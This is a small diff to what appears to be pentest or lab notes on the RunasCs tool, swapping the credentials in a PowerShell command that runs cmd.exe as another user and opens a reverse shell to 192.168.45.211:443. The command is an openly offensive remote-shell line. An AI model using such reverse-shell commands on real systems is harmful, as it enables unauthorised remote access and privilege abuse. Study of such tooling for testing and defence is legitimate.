@@ -10,7 +10,7 @@ RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the
 ```powershell
 
 # Initiates a remote shell as that user
-.\RunasCs.exe administrator Mypassword123 cmd.exe -r 192.168.45.211:443
+.\RunasCs.exe lala Lalala123 cmd.exe -r 192.168.45.211:443
 ```
 
 
